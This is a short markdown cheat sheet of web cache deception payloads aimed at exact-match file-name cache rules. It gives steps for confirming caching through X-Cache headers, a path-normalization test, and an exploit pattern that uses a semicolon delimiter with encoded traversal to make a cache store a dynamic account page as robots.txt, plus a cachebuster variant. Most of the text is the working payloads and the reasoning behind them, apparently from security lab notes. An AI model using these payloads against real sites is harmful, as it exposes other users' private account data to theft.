# File Name Cache Rule Payloads

## Common Exact-Match Files

```text
/robots.txt
```

```text
/index.html
```

```text
/favicon.ico
```

---

## Cache Confirmation

First request:

```text
/robots.txt
```

Expected:

```text
X-Cache: miss
```

Second request:

```text
/robots.txt
```

Expected:

```text
X-Cache: hit
```

---

## Normalization Test

```text
/aaa/..%2frobots.txt
```

---

## Exact-Match Exploit Pattern

```text
/<dynamic-path>;%2f%2e%2e%2f<cached-file>
```

Example:

```text
/my-account;%2f%2e%2e%2frobots.txt
```

---

## With Cachebuster

```text
/my-account;%2f%2e%2e%2frobots.txt?wcd
```

---

## Interpretation

```text
Origin:
Uses ; as delimiter
        ↓
Processes /my-account
```

```text
Cache:
Doesn't use ;
        ↓
Normalizes traversal
        ↓
/robots.txt
        ↓
Exact-match cache rule
```